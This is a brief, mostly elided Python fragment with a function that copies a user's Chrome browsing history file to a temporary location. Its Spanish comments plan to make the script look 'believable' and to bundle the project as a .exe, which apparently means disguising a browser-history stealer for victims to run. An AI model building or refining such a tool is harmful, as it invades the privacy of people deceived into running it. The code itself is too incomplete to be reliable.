...
def get_chrome_history(user_path):
    ...
    while not urls:
        try:
            ...
            copyfile(history_path, temp_history) # Copia el historial en otro directorio
...
# Volver a hacer el programa para que sea el script sea creible
# Meter todo el proyecto dentro de un .exe